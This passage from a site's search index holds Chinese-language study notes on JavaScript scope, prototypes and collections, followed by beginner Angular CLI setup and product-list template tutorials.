\u4e0d\u5728\u4efb\u4f55\u51fd\u6570\u5185\u5b9a\u4e49\u7684\u53d8\u91cf\u5c31\u5177\u6709\u5168\u5c40\u4f5c\u7528\u57df\u3002\u5b9e\u9645\u4e0a\uff0cJavaScript\u9ed8\u8ba4\u6709\u4e00\u4e2a\u5168\u5c40\u5bf9\u8c61 window \uff0c\u5168\u5c40\u4f5c\u7528\u57df\u7684\u53d8\u91cf\u5b9e\u9645\u4e0a\u88ab\u7ed1\u5b9a\u5230 window \u7684\u4e00\u4e2a\u5c5e\u6027\uff1a \u7531\u4e8e\u51fd\u6570\u5b9a\u4e49\u6709\u4e24\u79cd\u65b9\u5f0f\uff0c\u4ee5\u53d8\u91cf\u65b9\u5f0f var foo = function () {} \u5b9a\u4e49\u7684\u51fd\u6570\u5b9e\u9645\u4e0a\u4e5f\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u56e0\u6b64\uff0c\u9876\u5c42\u51fd\u6570\u7684\u5b9a\u4e49\u4e5f\u88ab\u89c6\u4e3a\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u5e76\u7ed1\u5b9a\u5230 window \u5bf9\u8c61\uff1a \u8fdb\u4e00\u6b65\u5927\u80c6\u5730\u731c\u6d4b\uff0c\u6211\u4eec\u6bcf\u6b21\u76f4\u63a5\u8c03\u7528\u7684 alert() \u51fd\u6570\u5176\u5b9e\u4e5f\u662f window \u7684\u4e00\u4e2a\u53d8\u91cf\uff1a \u540d\u5b57\u7a7a\u95f4 \u00b6 \u5168\u5c40\u53d8\u91cf\u4f1a\u7ed1\u5b9a\u5230 window \u4e0a\uff0c\u4e0d\u540c\u7684JavaScript\u6587\u4ef6\u5982\u679c\u4f7f\u7528\u4e86\u76f8\u540c\u7684\u5168\u5c40\u53d8\u91cf\uff0c\u6216\u8005\u5b9a\u4e49\u4e86\u76f8\u540c\u540d\u5b57\u7684\u9876\u5c42\u51fd\u6570\uff0c\u90fd\u4f1a\u9020\u6210\u547d\u540d\u51b2\u7a81\uff0c\u5e76\u4e14\u5f88\u96be\u88ab\u53d1\u73b0\u3002 \u51cf\u5c11\u51b2\u7a81\u7684\u4e00\u4e2a\u65b9\u6cd5\u662f\u628a\u81ea\u5df1\u7684\u6240\u6709\u53d8\u91cf\u548c\u51fd\u6570\u5168\u90e8\u7ed1\u5b9a\u5230\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\u4e2d\u3002\u4f8b\u5982\uff1a 1 2 3 4 5 6 7 8 9 10 11 // \u552f\u4e00\u7684\u5168\u5c40\u53d8\u91cfMYAPP: var MYAPP = {}; // \u5176\u4ed6\u53d8\u91cf: MYAPP . name = 'myapp' ; MYAPP . version = 1.0 ; // \u5176\u4ed6\u51fd\u6570: MYAPP . foo = function () { return 'foo' ; }; \u5c40\u90e8\u4f5c\u7528\u57df \u00b6 \u4f7f\u7528 var \u58f0\u660e\u7684\u53d8\u91cf\uff1a 1 \u5982\u679c\u6362\u6210 let 1 2 3 4 5 6 7 8 9 10 'use strict' ; function foo () { var sum = 0 ; for ( let i = 0 ; i < 100 ; i ++ ) { sum += i ; } // SyntaxError: i += 1 ; }","title":"\u5ed6\u96ea\u5cf0js\u9605\u8bfb\u7b14\u8bb01"},{"location":"language/javascript/js\u5ed6\u96ea\u5cf0\u9605\u8bfb\u7b14\u8bb01/#js1","text":"","title":"\u5ed6\u96ea\u5cf0js\u9605\u8bfb\u7b14\u8bb01"},{"location":"language/javascript/js\u5ed6\u96ea\u5cf0\u9605\u8bfb\u7b14\u8bb01/#_1","text":"\u5982\u679c\u8bbf\u95ee\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u5c5e\u6027\u4f1a\u8fd4\u56de\u4ec0\u4e48\u5462\uff1fJavaScript\u89c4\u5b9a\uff0c\u8bbf\u95ee\u4e0d\u5b58\u5728\u7684\u5c5e\u6027\u4e0d\u62a5\u9519\uff0c\u800c\u662f\u8fd4\u56de undefined \uff1a \u5224\u65ad\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u6709\u4e00\u4e2a\u5c5e\u6027\uff0c\u53ef\u4ee5\u7528 in \u64cd\u4f5c\u7b26 \u8981\u5224\u65ad\u4e00\u4e2a\u5c5e\u6027\u662f\u5426\u662f xiaoming \u81ea\u8eab\u62e5\u6709\u7684\uff0c\u800c\u4e0d\u662f\u7ee7\u627f\u5f97\u5230\u7684\uff0c\u53ef\u4ee5\u7528 hasOwnProperty() \u65b9\u6cd5\uff1a","title":"\u5bf9\u8c61"},{"location":"language/javascript/js\u5ed6\u96ea\u5cf0\u9605\u8bfb\u7b14\u8bb01/#mapset","text":"1 2 3 4 5 6 7 8 //map\u7684\u64cd\u4f5c var m = new Map(); // \u7a7aMap m.set('Adam', 67); // \u6dfb\u52a0\u65b0\u7684key-value m.set('Bob', 59); m.has('Adam'); // \u662f\u5426\u5b58\u5728key 'Adam': true m.get('Adam'); // 67 m.delete('Adam'); // \u5220\u9664key 'Adam' m.get('Adam'); // undefined set\u7684\u64cd\u4f5c\u57fa\u672c\u7c7b\u4f3c","title":"map\u548cset"},{"location":"language/javascript/js\u5ed6\u96ea\u5cf0\u9605\u8bfb\u7b14\u8bb01/#iterable","text":"\u904d\u5386 Array \u53ef\u4ee5\u91c7\u7528\u4e0b\u6807\u5faa\u73af\uff0c\u904d\u5386 Map \u548c Set \u5c31\u65e0\u6cd5\u4f7f\u7528\u4e0b\u6807\u3002\u4e3a\u4e86\u7edf\u4e00\u96c6\u5408\u7c7b\u578b\uff0cES6\u6807\u51c6\u5f15\u5165\u4e86\u65b0\u7684 iterable \u7c7b\u578b\uff0c Array \u3001 Map \u548c Set \u90fd\u5c5e\u4e8e iterable \u7c7b\u578b\u3002 \u5177\u6709 iterable \u7c7b\u578b\u7684\u96c6\u5408\u53ef\u4ee5\u901a\u8fc7\u65b0\u7684 for ... of \u5faa\u73af\u6765\u904d\u5386\u3002","title":"iterable"},{"location":"language/javascript/js\u5ed6\u96ea\u5cf0\u9605\u8bfb\u7b14\u8bb01/#foreach","text":"1 2 3 4 5 6 7 var a = ['A', 'B', 'C']; a.forEach(function (element, index, array) { // element: \u6307\u5411\u5f53\u524d\u5143\u7d20\u7684\u503c // index: \u6307\u5411\u5f53\u524d\u7d22\u5f15 // array: \u6307\u5411Array\u5bf9\u8c61\u672c\u8eab console.log(element + ', index = ' + index); });","title":"\u66f4\u9ad8\u7ea7\u7684forEach\u65b9\u6cd5"},{"location":"language/javascript/js\u5ed6\u96ea\u5cf0\u9605\u8bfb\u7b14\u8bb01/#_2","text":"JavaScript\u7684\u51fd\u6570\u5b9a\u4e49\u6709\u4e2a\u7279\u70b9\uff0c\u5b83\u4f1a\u5148\u626b\u63cf\u6574\u4e2a\u51fd\u6570\u4f53\u7684\u8bed\u53e5\uff0c\u628a\u6240\u6709\u7533\u660e\u7684\u53d8\u91cf\u201c\u63d0\u5347\u201d\u5230\u51fd\u6570\u9876\u90e8\uff1a","title":"\u53d8\u91cf\u63d0\u5347"},{"location":"language/javascript/js\u5ed6\u96ea\u5cf0\u9605\u8bfb\u7b14\u8bb01/#_3","text":"\u4e0d\u5728\u4efb\u4f55\u51fd\u6570\u5185\u5b9a\u4e49\u7684\u53d8\u91cf\u5c31\u5177\u6709\u5168\u5c40\u4f5c\u7528\u57df\u3002\u5b9e\u9645\u4e0a\uff0cJavaScript\u9ed8\u8ba4\u6709\u4e00\u4e2a\u5168\u5c40\u5bf9\u8c61 window \uff0c\u5168\u5c40\u4f5c\u7528\u57df\u7684\u53d8\u91cf\u5b9e\u9645\u4e0a\u88ab\u7ed1\u5b9a\u5230 window \u7684\u4e00\u4e2a\u5c5e\u6027\uff1a \u7531\u4e8e\u51fd\u6570\u5b9a\u4e49\u6709\u4e24\u79cd\u65b9\u5f0f\uff0c\u4ee5\u53d8\u91cf\u65b9\u5f0f var foo = function () {} \u5b9a\u4e49\u7684\u51fd\u6570\u5b9e\u9645\u4e0a\u4e5f\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u56e0\u6b64\uff0c\u9876\u5c42\u51fd\u6570\u7684\u5b9a\u4e49\u4e5f\u88ab\u89c6\u4e3a\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u5e76\u7ed1\u5b9a\u5230 window \u5bf9\u8c61\uff1a \u8fdb\u4e00\u6b65\u5927\u80c6\u5730\u731c\u6d4b\uff0c\u6211\u4eec\u6bcf\u6b21\u76f4\u63a5\u8c03\u7528\u7684 alert() \u51fd\u6570\u5176\u5b9e\u4e5f\u662f window \u7684\u4e00\u4e2a\u53d8\u91cf\uff1a","title":"\u5168\u5c40\u4f5c\u7528\u57df"},{"location":"language/javascript/js\u5ed6\u96ea\u5cf0\u9605\u8bfb\u7b14\u8bb01/#_4","text":"\u5168\u5c40\u53d8\u91cf\u4f1a\u7ed1\u5b9a\u5230 window \u4e0a\uff0c\u4e0d\u540c\u7684JavaScript\u6587\u4ef6\u5982\u679c\u4f7f\u7528\u4e86\u76f8\u540c\u7684\u5168\u5c40\u53d8\u91cf\uff0c\u6216\u8005\u5b9a\u4e49\u4e86\u76f8\u540c\u540d\u5b57\u7684\u9876\u5c42\u51fd\u6570\uff0c\u90fd\u4f1a\u9020\u6210\u547d\u540d\u51b2\u7a81\uff0c\u5e76\u4e14\u5f88\u96be\u88ab\u53d1\u73b0\u3002 \u51cf\u5c11\u51b2\u7a81\u7684\u4e00\u4e2a\u65b9\u6cd5\u662f\u628a\u81ea\u5df1\u7684\u6240\u6709\u53d8\u91cf\u548c\u51fd\u6570\u5168\u90e8\u7ed1\u5b9a\u5230\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\u4e2d\u3002\u4f8b\u5982\uff1a 1 2 3 4 5 6 7 8 9 10 11 // \u552f\u4e00\u7684\u5168\u5c40\u53d8\u91cfMYAPP: var MYAPP = {}; // \u5176\u4ed6\u53d8\u91cf: MYAPP . name = 'myapp' ; MYAPP . version = 1.0 ; // \u5176\u4ed6\u51fd\u6570: MYAPP . foo = function () { return 'foo' ; };","title":"\u540d\u5b57\u7a7a\u95f4"},{"location":"language/javascript/js\u5ed6\u96ea\u5cf0\u9605\u8bfb\u7b14\u8bb01/#_5","text":"\u4f7f\u7528 var \u58f0\u660e\u7684\u53d8\u91cf\uff1a 1 \u5982\u679c\u6362\u6210 let 1 2 3 4 5 6 7 8 9 10 'use strict' ; function foo () { var sum = 0 ; for ( let i = 0 ; i < 100 ; i ++ ) { sum += i ; } // SyntaxError: i += 1 ; }","title":"\u5c40\u90e8\u4f5c\u7528\u57df"},{"location":"language/javascript/js\u5f97\u7ee7\u627f\u673a\u5236/","text":"javascript\u7684\u7ee7\u627f\u673a\u5236 \u00b6 \u5982\u4f55\u7406\u89e3constructor \u00b6 JavaScript\u4e2dconstructor\u5c5e\u6027\u6307\u5411\u521b\u5efa\u5f53\u524d\u5bf9\u8c61\u7684\u6784\u9020\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 var a = 'zuckjet' ; console . log ( a . constructor ) // \u0192 String() { [native code] } function b () {} console . log ( b . constructor ) // \u0192 Function() { [native code] } var c = { name : 'zuckjet' }; console . log ( c . constructor ); //\u0192 Object() { [native code] } \u4f46\u662f\u5b9e\u9645\u4e0a constructor \u5e76\u4e0d\u5728\u5bf9\u8c61\u91cc\u9762\uff0c\u800c\u662f\u5728\u539f\u578b\u91cc\u9762 a.__proto__ \u5176\u5b9e\u5c31\u662f Array.prototype \u601d\u8003\u7684\u65f6\u5019\u505a\u4e00\u6b21\u66ff\u6362\u5c31\u884c \u7531\u4e8e\u7ee7\u627f\u673a\u5236\u6211\u4eec\u5728a\u8fd9\u4e2a\u5bf9\u8c61\u4e2d\u627e\u4e0d\u5230 constructor \u6240\u4ee5\u5c31\u4f1a\u53bb\u539f\u578b\u94fe\u4e0a\u627e\u5566 \u5982\u4f55\u7406\u89e3\u591a\u91cd\u7684 __proto__ \u00b6 \u6211\u4eec\u7ecf\u5e38\u4f1a\u770b\u5230 a.__proto__.__proto__ \u8fd9\u79cd\u5199\u6cd5\uff0c\u9996\u5148\u53ef\u4ee5\u5c06 a.__proto__ \u7406\u89e3\u6210\u4e0a\u4e00\u7ea7\u7684 prototype \u53ef\u662f\u90a3\u4e4b\u540e\u5462\uff1f \u6bd4\u5982 \u90a3\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u5c31\u53ea\u80fd\u628a Array \u7406\u89e3\u6210\u6bd4\u8f83\u7279\u6b8a\u7684\u5bf9\u8c61\u4e86 \u5176\u5b9e Array \u7684 prototype \u4e2d\u5c31\u5df2\u7ecf\u5199\u660e\u4e86 __proto__ \u6307\u5411\u8c01","title":"javascript\u7684\u7ee7\u627f\u673a\u5236"},{"location":"language/javascript/js\u5f97\u7ee7\u627f\u673a\u5236/#javascript","text":"","title":"javascript\u7684\u7ee7\u627f\u673a\u5236"},{"location":"language/javascript/js\u5f97\u7ee7\u627f\u673a\u5236/#constructor","text":"JavaScript\u4e2dconstructor\u5c5e\u6027\u6307\u5411\u521b\u5efa\u5f53\u524d\u5bf9\u8c61\u7684\u6784\u9020\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 var a = 'zuckjet' ; console . log ( a . constructor ) // \u0192 String() { [native code] } function b () {} console . log ( b . constructor ) // \u0192 Function() { [native code] } var c = { name : 'zuckjet' }; console . log ( c . constructor ); //\u0192 Object() { [native code] } \u4f46\u662f\u5b9e\u9645\u4e0a constructor \u5e76\u4e0d\u5728\u5bf9\u8c61\u91cc\u9762\uff0c\u800c\u662f\u5728\u539f\u578b\u91cc\u9762 a.__proto__ \u5176\u5b9e\u5c31\u662f Array.prototype \u601d\u8003\u7684\u65f6\u5019\u505a\u4e00\u6b21\u66ff\u6362\u5c31\u884c \u7531\u4e8e\u7ee7\u627f\u673a\u5236\u6211\u4eec\u5728a\u8fd9\u4e2a\u5bf9\u8c61\u4e2d\u627e\u4e0d\u5230 constructor \u6240\u4ee5\u5c31\u4f1a\u53bb\u539f\u578b\u94fe\u4e0a\u627e\u5566","title":"\u5982\u4f55\u7406\u89e3constructor"},{"location":"language/javascript/js\u5f97\u7ee7\u627f\u673a\u5236/#__proto__","text":"\u6211\u4eec\u7ecf\u5e38\u4f1a\u770b\u5230 a.__proto__.__proto__ \u8fd9\u79cd\u5199\u6cd5\uff0c\u9996\u5148\u53ef\u4ee5\u5c06 a.__proto__ \u7406\u89e3\u6210\u4e0a\u4e00\u7ea7\u7684 prototype \u53ef\u662f\u90a3\u4e4b\u540e\u5462\uff1f \u6bd4\u5982 \u90a3\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u5c31\u53ea\u80fd\u628a Array \u7406\u89e3\u6210\u6bd4\u8f83\u7279\u6b8a\u7684\u5bf9\u8c61\u4e86 \u5176\u5b9e Array \u7684 prototype \u4e2d\u5c31\u5df2\u7ecf\u5199\u660e\u4e86 __proto__ \u6307\u5411\u8c01","title":"\u5982\u4f55\u7406\u89e3\u591a\u91cd\u7684__proto__"},{"location":"language/javascript/ng0/","text":"ng\u8d77\u6b65 \u00b6 npm install -g angular-cli@latest \u5b89\u88c5Angular\u5b98\u65b9\u63d0\u4f9b\u7684\u547d\u4ee4\u884c\u5de5\u5177 \u5f00\u542f\u4e00\u4e2aterminal\uff08\u547d\u4ee4\u884c\u7a97\u53e3\uff09\uff0c\u952e\u5165 ng new hello-angular \u5c31\u751f\u6210\u4e86\u4e00\u4e2a\u9879\u76ee \u751f\u6210\u7ec4\u4ef6 \u00b6 \u5728\u547d\u4ee4\u884c\u7a97\u53e3\u8f93\u5165 ng generate component login --inline-template --inline-style component \u4e5f\u5c31\u662f\u7ec4\u4ef6\u7684\u610f\u601d\uff0c login \u8868\u660e\u8fd9\u4e2a\u7ec4\u4ef6\u7684\u540d\u5b57\uff0c --inline-template \u548c --inline-style \u8868\u660e\u662f\u5185\u8054\u6a21\u677f\u548c\u5185\u8054\u6837\u5f0f\u3002\u53ef\u4ee5\u7b80\u5199\u4e3a ng g c login -it -is angular-cli]\u5728 \\src\\app \u76ee\u5f55\u4e0b\u751f\u6210\u4e86\u4e00\u4e2a\u65b0\u6587\u4ef6\u5939login\uff0c\u5728login\u76ee\u5f55\u4e0b\u751f\u6210\u4e862\u4e2a\u6587\u4ef6\uff0c\u5176\u4e2d login.component.spec.ts \u662f\u6d4b\u8bd5\u6587\u4ef6\uff0c\u53e6\u4e00\u4e2a\u662f login.component.ts \u5c31\u662f\u65b0\u5efa\u7684Component\u4e86\u3002 \u6587\u4ef6\u547d\u540d \u00b6 \u6587\u4ef6\u547d\u540d\u65b9\u5f0f\u662f\u8fd9\u6837\u7684\uff1a \u7ec4\u4ef6\u540d\u79f0.component.ts \uff0c\u7ec4\u4ef6\u7684HTML\u6a21\u677f\u547d\u540d\u4e3a\uff1a \u7ec4\u4ef6\u540d\u79f0.component.html \uff0c\u7ec4\u4ef6\u7684\u6837\u5f0f\u6587\u4ef6\u547d\u540d\u4e3a\uff1a \u7ec4\u4ef6\u540d\u79f0.component.css login \u7ec4\u4ef6\u7684\u6e90\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import { Component , OnInit } from '@angular/core' ; //@Component\u662fAngular\u63d0\u4f9b\u7684\u88c5\u9970\u5668\u51fd\u6570\uff0c\u7528\u6765\u63cf\u8ff0Compoent\u7684\u5143\u6570\u636e //\u5176\u4e2dselector\u662f\u6307\u8fd9\u4e2a\u7ec4\u4ef6\u7684\u5728HTML\u6a21\u677f\u4e2d\u7684\u6807\u7b7e\u662f\u4ec0\u4e48 //template\u662f\u5d4c\u5165\uff08inline\uff09\u7684HTML\u6a21\u677f\uff0c\u5982\u679c\u4f7f\u7528\u5355\u72ec\u6587\u4ef6\u53ef\u7528templateUrl //styles\u662f\u5d4c\u5165\uff08inline\uff09\u7684CSS\u6837\u5f0f\uff0c\u5982\u679c\u4f7f\u7528\u5355\u72ec\u6587\u4ef6\u53ef\u7528styleUrls @ Component ({ selector : 'app-login' , template : ` <p> login Works! </p> ` , styles : [] }) export class LoginComponent implements OnInit { constructor () { } ngOnInit () { } } \u53c2\u8003 \u00b6 \u6398\u91d1 GitHub","title":"ng\u8d77\u6b65"},{"location":"language/javascript/ng0/#ng","text":"npm install -g angular-cli@latest \u5b89\u88c5Angular\u5b98\u65b9\u63d0\u4f9b\u7684\u547d\u4ee4\u884c\u5de5\u5177 \u5f00\u542f\u4e00\u4e2aterminal\uff08\u547d\u4ee4\u884c\u7a97\u53e3\uff09\uff0c\u952e\u5165 ng new hello-angular \u5c31\u751f\u6210\u4e86\u4e00\u4e2a\u9879\u76ee","title":"ng\u8d77\u6b65"},{"location":"language/javascript/ng0/#_1","text":"\u5728\u547d\u4ee4\u884c\u7a97\u53e3\u8f93\u5165 ng generate component login --inline-template --inline-style component \u4e5f\u5c31\u662f\u7ec4\u4ef6\u7684\u610f\u601d\uff0c login \u8868\u660e\u8fd9\u4e2a\u7ec4\u4ef6\u7684\u540d\u5b57\uff0c --inline-template \u548c --inline-style \u8868\u660e\u662f\u5185\u8054\u6a21\u677f\u548c\u5185\u8054\u6837\u5f0f\u3002\u53ef\u4ee5\u7b80\u5199\u4e3a ng g c login -it -is angular-cli]\u5728 \\src\\app \u76ee\u5f55\u4e0b\u751f\u6210\u4e86\u4e00\u4e2a\u65b0\u6587\u4ef6\u5939login\uff0c\u5728login\u76ee\u5f55\u4e0b\u751f\u6210\u4e862\u4e2a\u6587\u4ef6\uff0c\u5176\u4e2d login.component.spec.ts \u662f\u6d4b\u8bd5\u6587\u4ef6\uff0c\u53e6\u4e00\u4e2a\u662f login.component.ts \u5c31\u662f\u65b0\u5efa\u7684Component\u4e86\u3002","title":"\u751f\u6210\u7ec4\u4ef6"},{"location":"language/javascript/ng0/#_2","text":"\u6587\u4ef6\u547d\u540d\u65b9\u5f0f\u662f\u8fd9\u6837\u7684\uff1a \u7ec4\u4ef6\u540d\u79f0.component.ts \uff0c\u7ec4\u4ef6\u7684HTML\u6a21\u677f\u547d\u540d\u4e3a\uff1a \u7ec4\u4ef6\u540d\u79f0.component.html \uff0c\u7ec4\u4ef6\u7684\u6837\u5f0f\u6587\u4ef6\u547d\u540d\u4e3a\uff1a \u7ec4\u4ef6\u540d\u79f0.component.css login \u7ec4\u4ef6\u7684\u6e90\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import { Component , OnInit } from '@angular/core' ; //@Component\u662fAngular\u63d0\u4f9b\u7684\u88c5\u9970\u5668\u51fd\u6570\uff0c\u7528\u6765\u63cf\u8ff0Compoent\u7684\u5143\u6570\u636e //\u5176\u4e2dselector\u662f\u6307\u8fd9\u4e2a\u7ec4\u4ef6\u7684\u5728HTML\u6a21\u677f\u4e2d\u7684\u6807\u7b7e\u662f\u4ec0\u4e48 //template\u662f\u5d4c\u5165\uff08inline\uff09\u7684HTML\u6a21\u677f\uff0c\u5982\u679c\u4f7f\u7528\u5355\u72ec\u6587\u4ef6\u53ef\u7528templateUrl //styles\u662f\u5d4c\u5165\uff08inline\uff09\u7684CSS\u6837\u5f0f\uff0c\u5982\u679c\u4f7f\u7528\u5355\u72ec\u6587\u4ef6\u53ef\u7528styleUrls @ Component ({ selector : 'app-login' , template : ` <p> login Works! </p> ` , styles : [] }) export class LoginComponent implements OnInit { constructor () { } ngOnInit () { } }","title":"\u6587\u4ef6\u547d\u540d"},{"location":"language/javascript/ng0/#_3","text":"\u6398\u91d1 GitHub","title":"\u53c2\u8003"},{"location":"language/javascript/ng1/","text":"ng\u5b98\u65b9\u6587\u6863\u5165\u95e8\u624b\u518c \u00b6 \u521b\u5efa\u4e00\u4e2a\u65b0\u9879\u76ee \u00b6 \u70b9\u6b64\u5728 StackBlitz \u4e0a\u521b\u5efa\u4e00\u4e2a\u65b0\u9879\u76ee \u7528 StackBlitz \u521b\u5efa\u4e00\u4e2a\u5165\u95e8\u7ea7 Angular \u5e94\u7528\u3002\u6211\u4eec\u5df2\u7ecf\u4e3a\u8fd9\u4e2a\u5e94\u7528\u6dfb\u52a0\u4e86\u4e00\u4e2a\u5305\u542b\u5546\u5e97\u540d\u79f0\u548c\u7ed3\u5e10\u56fe\u6807\u7684\u9876\u680f\uff0c\u4ee5\u53ca\u5546\u54c1\u5217\u8868\u7684\u6807\u9898\u3002 \u6a21\u677f\u8bed\u6cd5 \u00b6 Angular \u7684\u6a21\u677f\u8bed\u6cd5\u6269\u5c55\u4e86 HTML \u548c JavaScript\u3002 \u5728 product-list \u6587\u4ef6\u5939\u4e2d\uff0c\u6253\u5f00\u6a21\u677f\u6587\u4ef6 product-list.component.html \u3002 \u4fee\u6539\u5546\u54c1\u5217\u8868\u6a21\u677f\uff0c\u770b\u662f\u5426\u5217\u51fa\u4e86\u5546\u54c1\u540d\u79f0\u3002 \u6211\u4eec\u5e0c\u671b\u5217\u8868\u4e2d\u7684\u6bcf\u4e2a\u5546\u54c1\u80fd\u4ee5\u540c\u6837\u7684\u65b9\u5f0f\u5728\u9875\u9762\u4e0a\u6328\u4e2a\u663e\u793a\u51fa\u6765\u3002\u8981\u904d\u5386\u8fd9\u4e9b\u9884\u5b9a\u4e49\u7684\u5546\u54c1\u5217\u8868\uff0c\u8bf7\u4f7f\u7528 *ngFor \u6307\u4ee4\u3002\u628a *ngFor \u6307\u4ee4\u52a0\u5230 <div> \u4e0a\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a 1 2 3 4 < h2 > Products < /h2> < div * ngFor = \"let product of products\" > < /div> *ngFor \u4f1a\u5bfc\u81f4 <div> \u88ab\u5217\u8868\u4e2d\u7684\u6bcf\u4e2a\u5546\u54c1\u90fd\u91cd\u590d\u6e32\u67d3\u4e00\u6b21\u3002 *ngFor \u662f\u4e00\u4e2a \"\u7ed3\u6784\u578b\u6307\u4ee4\"\u3002\u7ed3\u6784\u578b\u6307\u4ee4\u4f1a\u901a\u8fc7\u6dfb\u52a0\u3001\u5220\u9664\u548c\u64cd\u7eb5\u5b83\u4eec\u7684\u5bbf\u4e3b\u5143\u7d20\u7b49\u65b9\u5f0f\u5851\u9020\u6216\u91cd\u5851 DOM \u7684\u7ed3\u6784\u3002\u4efb\u4f55\u5e26\u6709 * \u7684\u6307\u4ee4\u90fd\u662f\u7ed3\u6784\u578b\u6307\u4ee4\u3002 \u8981\u663e\u793a\u5546\u54c1\u7684\u540d\u79f0\uff0c\u8bf7\u4f7f\u7528\u63d2\u503c\u8bed\u6cd5 \u3002\u63d2\u503c\u4f1a\u628a\u5c5e\u6027\u7684\u503c\u4f5c\u4e3a\u6587\u672c\u6e32\u67d3\u51fa\u6765\u3002\u5728 <div> \u91cc\u9762\uff0c\u6dfb\u52a0\u4e00\u4e2a <h3> \u6807\u9898\u6765\u663e\u793a\u5546\u54c1 name \u5c5e\u6027\u7684\u63d2\u503c\uff1a 1 2 3 4 5 6 7 8 9 < h2 > Products < /h2> < div * ngFor = \"let product of products\" > < h3 > {{ product . name }} < /h3> < /div> \u9884\u89c8\u7a97\u683c\u4f1a\u7acb\u5373\u66f4\u65b0\uff0c\u4ee5\u663e\u793a\u5217\u8868\u4e2d\u6bcf\u4e2a\u5546\u54c1\u7684\u540d\u79f0\u3002 \u5728\u6700\u7ec8\u7684\u5e94\u7528\u4e2d\uff0c\u6bcf\u4e2a\u5546\u54c1\u540d\u79f0\u90fd\u4f1a\u94fe\u63a5\u5230\u5546\u54c1\u8be6\u60c5\u3002\u73b0\u5728\u6dfb\u52a0\u8fd9\u4e2a\u94fe\u63a5\uff0c\u5e76\u4f7f\u7528\u5c5e\u6027\u7ed1\u5b9a\u8bed\u6cd5 [] \u628a\u8be5\u94fe\u63a5\u7684 title \u8bbe\u7f6e\u6210\u8be5\u5546\u54c1\u7684\u540d\u5b57\uff0c\u5982\u4e0b\u6240\u793a: 1 2 3 4 5 6 7 8 9 10 11 < h2 > Products < /h2> < div * ngFor = \"let product of products\" > < h3 > < a [ title ] = \"product.name + ' details'\" > {{ product . name }} < /a> < /h3> < /div> \u5728\u9884\u89c8\u7a97\u683c\u4e2d\uff0c\u5c06\u9f20\u6807\u60ac\u505c\u5728\u663e\u793a\u7684\u5546\u54c1\u540d\u79f0\u4e0a\uff0c\u53ef\u4ee5\u770b\u5230\u7ed1\u5b9a\u7684 name \u5c5e\u6027\u503c\u3002\u5b83\u4eec\u4fe9\u662f\u4e00\u6837\u7684\u3002\u63d2\u503c\u8868\u8fbe\u5f0f \u5141\u8bb8\u4f60\u628a\u5c5e\u6027\u503c\u6e32\u67d3\u4e3a\u6587\u672c\uff1b\u800c\u5c5e\u6027\u7ed1\u5b9a\u8bed\u6cd5 [] \u5219\u5141\u8bb8\u4f60\u5728\u6a21\u677f\u8868\u8fbe\u5f0f\u4e2d\u4f7f\u7528\u5c5e\u6027\u503c\u3002 \u6dfb\u52a0\u5546\u54c1\u8bf4\u660e\u3002\u5728 p \u6807\u7b7e\u4e0a\uff0c\u4f7f\u7528 *ngIf \u6307\u4ee4\uff0c\u8fd9\u6837\u624d\u80fd\u5728\u5f53\u524d\u5546\u54c1\u6709\u63cf\u8ff0\u4fe1\u606f\u7684\u60c5\u51b5\u4e0b\u521b\u5efa\u8fd9\u4e2a p \u5143\u7d20\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 < h2 > Products < /h2> < div * ngFor = \"let product of products\" > < h3 > < a [ title ] = \"product.name + ' details'\" > {{ product . name }} < /a> < /h3> < p * ngIf = \"product.description\" > Description : {{ product . description }} < /p> < /div> \u8be5\u5e94\u7528\u4f1a\u7acb\u5373\u5728\u5217\u8868\u4e2d\u663e\u793a\u6bcf\u79cd\u5546\u54c1\u7684\u540d\u79f0\u548c\u63cf\u8ff0\uff0c\u5982\u4e0b\u6240\u793a\u3002\u8bf7\u6ce8\u610f\uff0c\u6700\u540e\u4e00\u4e2a\u5546\u54c1\u6839\u672c\u6ca1\u6709\u63cf\u8ff0\u4fe1\u606f\u3002\u7531\u4e8e\u8be5\u5546\u54c1\u7684 description \u5c5e\u6027\u4e3a\u7a7a\uff0c\u56e0\u6b64\u4e0d\u4f1a\u521b\u5efa p \u5143\u7d20\uff08\u5305\u62ec\u9759\u6001\u6587\u672c \u201cDescription\u201d\uff09\u3002 \u6dfb\u52a0\u4e00\u4e2a\u6309\u94ae\uff0c\u4ee5\u4fbf\u8ba9\u7528\u6237\u53ef\u4e0e\u670b\u53cb\u5206\u4eab\u5546\u54c1\u3002\u628a button \u7684 click \u4e8b\u4ef6\u7ed1\u5b9a\u5230\u6211\u4eec\u66ff\u4f60\u5b9a\u4e49\u597d\u7684 share() \u4e8b\u4ef6\u4e0a\uff08\u4f4d\u4e8e product-list.component.ts \uff09\u3002\u4e8b\u4ef6\u7ed1\u5b9a\u662f\u901a\u8fc7\u628a\u4e8b\u4ef6\u540d\u79f0\u5305\u88f9\u5728\u5706\u62ec\u53f7 () \u4e2d\u5b8c\u6210\u7684\uff0c\u5982\u4e0b\u6240\u793a\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 < h2 > Products < /h2> < div * ngFor = \"let product of products\" > < h3 > < a [ title ] = \"product.name + ' details'\" > {{ product . name }} < /a> < /h3> < p * ngIf = \"product.description\" > Description : {{ product . description }} < /p> < button ( click ) = \"share()\" > Share < /button> < /div> \u73b0\u5728\uff0c\u6bcf\u4e2a\u5546\u54c1\u90fd\u6709\u4e00\u4e2a \u201cShare\u201d \u6309\u94ae\u4e86\uff1a 